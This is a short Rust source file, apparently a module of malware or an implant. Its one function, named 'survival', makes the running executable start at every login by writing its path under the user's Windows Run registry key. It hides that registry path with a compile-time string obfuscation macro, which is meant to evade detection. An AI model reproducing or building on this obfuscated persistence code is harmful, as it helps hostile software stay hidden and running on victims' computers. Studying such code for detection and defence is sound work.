use std::env;
use std::path::PathBuf;
use winreg::enums::*;
use winreg::RegKey;
use goldberg::goldberg_string;

use crate::debug_println;

#[inline]
pub fn classic_registry_based_survival(program_name: &str) -> Result<(), Box<dyn std::error::Error>> {
    if env::consts::OS != "windows" {
        return Ok(());
    }

    if program_name.is_empty() {
        return Err("Program name cannot be empty".into());
    }

    let exe_path: PathBuf = env::current_exe()?;
    let exe_path_str = exe_path.to_str().ok_or("Failed to convert path to string")?;

    let hklm = RegKey::predef(HKEY_CURRENT_USER);

    let run_path = goldberg_string!("Software\\Microsoft\\Windows\\CurrentVersion\\Run").to_string();

    match hklm.create_subkey(&run_path) {
        Err(e) => Err(Box::new(e) as Box<dyn std::error::Error>),
        Ok((key, _disp)) => {
            key.set_value(program_name, &exe_path_str)?;
            debug_println!("Set persistence in Run path: {}", run_path);
            Ok(())
        }
    }
}